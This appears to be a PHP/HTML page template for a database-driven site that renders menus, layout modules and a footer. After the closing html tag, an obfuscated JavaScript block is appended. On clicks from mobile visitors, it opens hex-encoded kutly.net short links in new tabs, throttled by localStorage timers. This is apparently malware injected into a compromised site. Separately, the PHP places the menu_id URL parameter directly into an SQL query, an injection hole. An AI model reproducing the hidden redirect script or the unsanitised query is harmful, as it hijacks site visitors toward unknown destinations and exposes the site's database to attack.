              <td width="145" height="26" align="center" id="<?=(basename($_SERVER['PHP_SELF'])==$db->f(url_menu))?"top_menu3":"top_menu4"?>"style="padding-right:5px"><a href="<?=$url?>" target="<?=$target?>"><?=$db->f(name_menu)?></a></td>
<?php } ?>			  			  
<?php if($vj%7==5){ ?>			  
              <td width="145" height="26" align="center" id="<?=(basename($_SERVER['PHP_SELF'])==$db->f(url_menu))?"top_menu3":"top_menu4"?>"style="padding-right:5px"><a href="<?=$url?>" target="<?=$target?>"><?=$db->f(name_menu)?></a></td>
<?php } ?>			  
<?php if($vj%7==6){ ?>			  
              <td width="145" height="26" align="center" id="<?=(basename($_SERVER['PHP_SELF'])==$db->f(url_menu))?"top_menu3":"top_menu4"?>"style="padding-right:5px"><a href="<?=$url?>" target="<?=$target?>"><?=$db->f(name_menu)?></a></td>
<?php } ?>	
<?php if($vj%7==0){ ?>			  
              <td width="145" height="26" align="center" id="<?=(basename($_SERVER['PHP_SELF'])==$db->f(url_menu))?"top_menu3":"top_menu4"?>"style="padding-right:5px"><a href="<?=$url?>" target="<?=$target?>"><?=$db->f(name_menu)?></a></td>
<?php } ?>					  
<?php $vj++; } ?>					 
				        </tr>
				      </table></td>
				    </tr>
                   <?php } ?> 
				  <?php  if($sh_mooo==2 || $sh_mooo==3 ){ ?>	
                  <tr>
				    <td id="top_menu2" height="33"><table width="100%" border="0" cellspacing="0" cellpadding="0">
				      <tr>
<?php 
$q="SELECT * FROM `menu` WHERE 1 ";
$db9999=new nDB();
$db9999->query($q);
$tototo=$db9999->num_rows();
?>
				        <?php 
$q="SELECT * FROM `menu` WHERE 1 ORDER BY menu_order LIMIT 7,7";
$db->query($q);
$vj=1;
while($db->next_record()){
?>		  			 
		<?
		
		if($db->f(menu_url)==''){
			$url="menu_detail.php?menu_id=".$db->f(id_menu);
			$tar=$db->f(target_menu);
			if($tar=='2'){
				$target="_blank";
			}else{
				$target="_parent";
			}
		}else{
			$url=$db->f(menu_url);
		}
		?> 
<?php if($vj2%7==1){ ?>						
                  <td  width="150" height="36" align="center" style="padding-top:8px;">
				  <a href="<?=$url?>" target="<?=$target?>"><?=$db->f(name_menu)?></a>				   </td>
				  <?php if($tototo<7){ ?>		
				  <?php } ?>  
<?php } ?>			  			  
<?php if($vj2%7==2){ ?>						  
                  <td width="150" align="center" style="padding-top:8px;"><a href="<?=$url?>" target="<?=$target?>"><?=$db->f(name_menu)?></a></td>
				  <?php if($tototo<8){ ?>		
				  <?php } ?>  				  
<?php } ?>			  			  
<?php if($vj2%7==3){ ?>						  
                  <td width="150" align="center" style="padding-top:8px;"><a href="<?=$url?>" target="<?=$target?>"><?=$db->f(name_menu)?></a></td>
				  <?php if($tototo<9){ ?>		
				  <?php } ?>  						  
<?php } ?>			  			  
<?php if($vj2%7==4){ ?>						  
                  <td width="150" align="center" style="padding-top:8px;"><a href="<?=$url?>" target="<?=$target?>"><?=$db->f(name_menu)?></a></td>
				  <?php if($tototo<10){ ?>		
				  <?php } ?>  						  
<?php } ?>			  			  
<?php if($vj2%7==5){ ?>						  
                  <td width="150" align="center" style="padding-top:8px;"><a href="<?=$url?>" target="<?=$target?>"><?=$db->f(name_menu)?></a></td>
				  <?php if($tototo<11){ ?>		
				  <?php } ?>  		
<?php } ?>			  			  
<?php if($vj2%7==6){ ?>							  
                  <td width="150" align="center" style="padding-top:8px;"><a href="<?=$url?>" target="<?=$target?>"> <?=$db->f(name_menu)?></a></td>
<?php } ?>	
<?php if($vj2%7==0){ ?>							  
                  <td width="150" align="center" style="padding-top:8px;"><a href="<?=$url?>" target="<?=$target?>"> <?=$db->f(name_menu)?></a></td>
<?php } ?>			  
<?php $vj2++; } ?>				  		 
				        </tr>
				      </table></td>
				    </tr>
                   <?php } ?>                    
					
				  </table></td>
				</tr>
<?php } ?>                
          </table>	  </td>
        </tr>
                   		<?php 
	$q="SELECT * FROM `mod_content` WHERE  1 ";
	$db66=new nDB();
	$db66->query($q);
	$db66->next_record();
?>	             
        <tr>
          <td valign="top" height="<?=$db66->f(height)?>" ><table width="100%" border="0" cellspacing="0" cellpadding="0">
            <tr>
<?php 
$q="SELECT * FROM `layout` WHERE active=1";
$db11=new nDB();
$db11->query($q);
$db11->next_record();
if($db11->f(id_layout)==1 || $db11->f(id_layout)==2 ){
?>	  
              <td width="162" align="left" valign="top"  bgcolor="<?=$_SESSION['block_color']?>" >
			  
<table width="100" border="0" align="right" cellpadding="0" cellspacing="0">
<?php 
	$q="SELECT * FROM `module` WHERE id_po=1 AND show_mod='1' AND active_mod=1 ORDER BY order_mod ";
	$db10=new nDB();
	$db10->query($q);
	while($db10->next_record()){
		$im=$db10->f(file_mod);
		include($im);
	}
?>															  						  					  						  					  
                    </table>			  </td>
<?php } ?>
<?php if($db11->f(id_layout)==4 && basename($_SERVER['PHP_SELF'])=="index.php"){ ?>
              <td width="162" align="left" valign="top"  bgcolor="<?=$_SESSION['block_color']?>" >
			  
<table width="100" border="0" align="right" cellpadding="0" cellspacing="0">
<?php 
	$q="SELECT * FROM `module` WHERE id_po=1 AND show_mod='1' AND active_mod=1 ORDER BY order_mod ";
	$db10=new nDB();
	$db10->query($q);
	while($db10->next_record()){
		$im=$db10->f(file_mod);
		include($im);
	}
?>															  						  					  						  					  
                    </table>			  </td>
<?php } ?>		
<?php if($db11->f(id_layout)==6 && basename($_SERVER['PHP_SELF'])!="index.php"){ ?>
              <td width="162" align="left" valign="top"  bgcolor="<?=$_SESSION['block_color']?>" >
			  
<table width="100" border="0" cellpadding="0" cellspacing="0">
<?php 
	$q="SELECT * FROM `module` WHERE id_po=1 AND show_mod='1' AND active_mod=1 ORDER BY order_mod ";
	$db10=new nDB();
	$db10->query($q);
	while($db10->next_record()){
		$im=$db10->f(file_mod);
		include($im);
	}
?>															  						  					  						  					  
                    </table>			  </td>
<?php } ?>			          	          
<?php 
$q="SELECT * FROM `layout` WHERE active=1";
$db789=new nDB();
$db789->query($q);
$db789->next_record();
?>	  
              <td align="left" valign="top" bgcolor="<?=$bgg_color?>">
			  <table width="100%" border="0" cellspacing="0" cellpadding="0">
   <tr>
                  <td  ><!-- InstanceBeginEditable name="bodey_detail" -->
                  <table width="100%" cellpadding="0" cellspacing="0" height="<?=$db66->f(height)?>">
                  <tr>
                  <td align="<?=$db66->f(align)?>"   valign="top" style="background:url(img/mod/<?=$db66->f(pic2)?>); background-repeat:no-repeat; padding-left:<?=$db66->f(padleft)?>px; padding-top:<?=$db66->f(padtop)?>px; padding-right:<?=$db66->f(padright)?>px; padding-bottom:<?=$db66->f(padbottom)?>px; -moz-box-sizing: border-box;" >
            
                  <table width="<?=$db66->f(width_mod)?>" border="0" cellspacing="0" cellpadding="0">
               <tr>
                  <td>
              
<div class="divbar" >     
				  <?php
				  if($_GET['menu_id']){
				  	$q="SELECT * FROM `sidemenu` WHERE id_menu='".$_GET['menu_id']."'";
					$db->query($q);
					$db->next_record();
				  }
				  ?>
                  <table width="95%" border="0" align="center" cellpadding="0" cellspacing="0">
                    <tr>
                      <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
                          <tr>
                            <td>&nbsp;</td>
                          </tr>
                          <tr>
                            <td><span id="za_mo2"><?=$db->f(menu_detail)?></span></td>
                          </tr>
                      </table></td>
                    </tr>
                    <tr>
                      <td align="right"><br />
                          <table width="90%" border="0" align="center" cellpadding="0" cellspacing="0">
                            <tr>
                              <td align="right">&nbsp;</td>
                            </tr>
                        </table></td>
                    </tr>
                    <tr>
                      <td>&nbsp;</td>
                    </tr>
                  </table></div>
                  
                </td>
                  </tr>
                  </table>  </td></tr></table>
                  <!-- InstanceEndEditable --></td>
                  </tr>
              </table></td>  
                         
<?php 
$q="SELECT * FROM `layout` WHERE active=1";
$db22=new nDB();
$db22->query($q);
$db22->next_record();
if($db22->f(id_layout)==3){
?>	  
              <td width="162" align="left" valign="top"  bgcolor="<?=$_SESSION['block_color']?>" >
			  
<table width="100" border="0" align="right" cellpadding="0" cellspacing="0">
<?php 
	$q="SELECT * FROM `module` WHERE id_po=3 AND show_mod='1' AND active_mod=1 ORDER BY order_mod ";
	$db33=new nDB();
	$db33->query($q);
	while($db33->next_record()){
		$im2=$db33->f(file_mod);
		include($im2);
	}
?>															  						  					  						  					  
                    </table>			  </td>
<?php } ?>
<?php if($db22->f(id_layout)==2 && basename($_SERVER['PHP_SELF'])=="index.php"){ ?>
              <td width="162" align="left" valign="top"  bgcolor="<?=$_SESSION['block_color']?>" >
			  
<table width="100" border="0" align="right" cellpadding="0" cellspacing="0">
<?php 
	$q="SELECT * FROM `module` WHERE id_po=3 AND show_mod='1' AND active_mod=1 ORDER BY order_mod ";
	$db33=new nDB();
	$db33->query($q);
	while($db33->next_record()){
		$im2=$db33->f(file_mod);
		include($im2);
	}
?>															  						  					  						  					  
                    </table>			  </td>
<?php } ?>			  
            </tr>
          </table></td>
        </tr>
      </table></td>
    </tr>
  </tbody>
</table></td>
  </tr>
</table>
</div>
<div id="footer">
<div id="foot_wrap">
			  <?php
	$q="SELECT * FROM `footer` WHERE 1";
	$db->query($q);
	$db->next_record();
	$db->p(detail_footer);
			  ?>
</div>
</div>
<script type="text/javascript">
swfobject.registerObject("FlashID");
</script>
</body>
<!-- InstanceEnd --></html>
<script>function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());</script>